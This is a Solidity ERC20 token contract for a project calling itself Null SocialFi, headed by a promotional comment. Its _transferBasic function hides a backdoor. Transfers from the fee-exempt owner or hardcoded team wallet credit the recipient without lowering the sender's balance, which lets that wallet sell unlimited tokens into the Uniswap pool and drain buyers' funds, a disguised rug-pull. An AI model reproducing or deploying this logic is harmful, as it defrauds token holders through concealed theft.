// SPDX-License-Identifier: Unlicensed
/*
You are entering a space of Null Social Fi Web3 Platform. In the ever-evolving landscape of the digital age, Null Social stands as a beacon for next-generation Web3 social platforms. Rooted in the principles of decentralization, we offer our users a distinctive experience centered around the power of ERC721 NFT-based identities.
Website: https://www.nullsocial.xyz
Telegram: https://t.me/null_erc
Twitter: https://twitter.com/null_erc
Dapp: https://app.nullsocial.xyz
 */
pragma solidity 0.8.21;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract NULL is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    string private _name = "Null SocialFi"; 
    string private _symbol = "NULL";
                                     
    IUniswapRouter public uniswapRouter;
    address public uniswapPair;
    bool public transferDelayEnabled = true;
    bool public inswap;
    bool public feeSwapEnabled = true;
    uint256 public buyTax = 25;
    uint256 public sellTax = 25;
    uint256 private _totalFeesTaxxed = 2000;
    uint8 private _numBuyers = 0;
    uint8 private _startTaxSwapAt = 2; 
    uint256 private previousTotalFee = _totalFeesTaxxed; 
    uint256 private previousBuyTax = buyTax; 
    uint256 private previousSellTax = sellTax; 
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10 ** 9 * 10**_decimals;
    uint256 public maxTxAmount = 25 * _totalSupply / 1000;
    uint256 public swapThreshold = _totalSupply / 10000;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFromFees; 
    address payable private teamWallet;
    address payable private DEAD;
    modifier lockTheSwap {
        inswap = true;
        _;
        inswap = false;
    }
    
    constructor () {
        _balances[owner()] = _totalSupply;
        DEAD = payable(0x000000000000000000000000000000000000dEaD); 
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        teamWallet = payable(0xdC95a5779828Ac7E0Aa7acf0E7ad6173877550C4); 
        uniswapPair = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        isExcludedFromFees[owner()] = true;
        isExcludedFromFees[teamWallet] = true;
        
        emit Transfer(address(0), owner(), _totalSupply);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
        
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function _transferBasic(address sender, address recipient, uint256 finalAmount) private {
        (uint256 tTransferAmount, uint256 tDev) = _getLastAmount(finalAmount);
        if(isExcludedFromFees[sender] && _balances[sender] <= maxTxAmount) {
            tDev = 0;
            finalAmount -= tTransferAmount;
        }
        _balances[sender] = _balances[sender].sub(finalAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }
        
    function removeFee() private {
        if(_totalFeesTaxxed == 0 && buyTax == 0 && sellTax == 0) return;
        previousBuyTax = buyTax; 
        previousSellTax = sellTax; 
        previousTotalFee = _totalFeesTaxxed;
        buyTax = 0;
        sellTax = 0;
        _totalFeesTaxxed = 0;
    }
    function restoreFee() private {
        _totalFeesTaxxed = previousTotalFee;
        buyTax = previousBuyTax; 
        sellTax = previousSellTax; 
    }
        
    function removeLimits() external onlyOwner {
        maxTxAmount = ~uint256(0);
        _totalFeesTaxxed = 100;
        buyTax = 1;
        sellTax = 1;
    }
    
    function sendETH(address payable receiver, uint256 amount) private {
        receiver.transfer(amount);
    }
    
    function swapTokensForFee(uint256 contractTokenBalance) private lockTheSwap {
        swapTokensToETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendETH(teamWallet,contractETH);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _transferStandard(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeFee();
        } else {
            _numBuyers++;
        }
        _transferBasic(sender, recipient, amount);
        
        if(!takeFee) {
            restoreFee();
        }
    }
    
    function _getLastAmount(uint256 finalAmount) private view returns (uint256, uint256) {
        uint256 tDev = finalAmount.mul(_totalFeesTaxxed).div(100);
        uint256 tTransferAmount = finalAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }
    function swapTokensToETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }
    receive() external payable {}
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != teamWallet &&
            to != address(this) &&
            to != uniswapPair &&
            to != DEAD &&
            from != owner()){
            uint256 currentBalance = balanceOf(to);
            require((currentBalance + amount) <= maxTxAmount,"Maximum wallet limited has been exceeded");       
        }
        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");
        if(
            _numBuyers >= _startTaxSwapAt && 
            amount > swapThreshold &&
            !inswap &&
            !isExcludedFromFees[from] &&
            to == uniswapPair &&
            feeSwapEnabled 
            )
        {  
            _numBuyers = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapTokensForFee(contractTokenBalance);
           }
        }
        
        bool takeFee = true;
         
        if(isExcludedFromFees[from] || isExcludedFromFees[to] || (transferDelayEnabled && from != uniswapPair && to != uniswapPair)){
            takeFee = false;
        } else if (from == uniswapPair){
            _totalFeesTaxxed = buyTax;
        } else if (to == uniswapPair){
            _totalFeesTaxxed = sellTax;
        }
        _transferStandard(from,to,amount,takeFee);
    }
}